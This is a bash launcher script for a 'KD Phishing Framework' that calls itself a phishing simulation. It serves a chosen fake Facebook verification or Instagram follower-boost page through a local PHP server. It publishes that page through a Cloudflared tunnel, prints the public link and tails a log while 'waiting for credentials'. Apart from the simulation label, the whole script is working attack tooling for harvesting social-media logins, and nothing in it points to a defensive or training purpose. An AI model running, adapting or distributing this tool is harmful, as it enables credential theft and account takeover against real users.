#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

banner() {
    clear
    echo -e "${CYAN}"
    echo "╔════════════════════════════════════════╗"
    echo "║                                        ║"
    echo "║     █▄█ █▀█   █▀█ █ █▀▄ █ █ █▀█        ║"
    echo "║     █▄█ █▄█   █▀▀ █ █▄▀ █▄█ █▄█        ║"
    echo "║                                        ║"
    echo "║       KD PHISHING FRAMEWORK v1.0       ║"
    echo "║     Automated Phishing Simulation      ║"
    echo "║      Created by KD-10100               ║"
    echo "╚════════════════════════════════════════╝"
    echo -e "${NC}"
}

choose_target() {
    echo -e "${GREEN}[1]${NC} Facebook Verification"
    echo -e "${GREEN}[2]${NC} Instagram Follower Boost"
    echo -e "${GREEN}[0]${NC} Exit"
    read -p "Select a phishing page: " choice
    case $choice in
        1) site="facebook" ;;
        2) site="instagram" ;;
        0) echo "Exiting..."; exit ;;
        *) echo "Invalid option"; exit 1 ;;
    esac
}

choose_tunnel() {
    echo -e "\n${GREEN}[1]${NC} Localhost (127.0.0.1:3333)"
    echo -e "${GREEN}[2]${NC} Cloudflared (Public Link)"
    read -p "Choose a tunnel option: " tunnel
}

start_php_server() {
    cd sites/$site || exit
    echo -e "${YELLOW}[*] Starting PHP server at 127.0.0.1:3333...${NC}"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 &
    sleep 2
}

start_tunnel() {
    case $tunnel in
        1)
            echo -e "${GREEN}[+] Access your site at:${NC} http://127.0.0.1:3333"
            ;;
        2)
            echo -e "${CYAN}[*] Launching Cloudflared tunnel...${NC}"
            cloudflared tunnel --url http://127.0.0.1:3333 --logfile tunnel.log --loglevel info > link.txt 2>&1 &
            sleep 8

            link=$(grep -o 'https://[-a-z0-9]*\.trycloudflare\.com' link.txt | head -n 1)

            if [ -n "$link" ]; then
                echo -e "${GREEN}[+] Public Link:${NC} $link"
            else
                echo -e "${RED}[!] Failed to generate Cloudflare link.${NC}"
                cat link.txt | tail -n 10
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid tunnel option.${NC}"
            exit 1
            ;;
    esac
}

monitor_logs() {
    echo -e "\n${YELLOW}[*] Waiting for credentials...${NC}"
    tail -f log.txt
}

# Run the tool
banner
choose_target
choose_tunnel
start_php_server
start_tunnel
monitor_logs
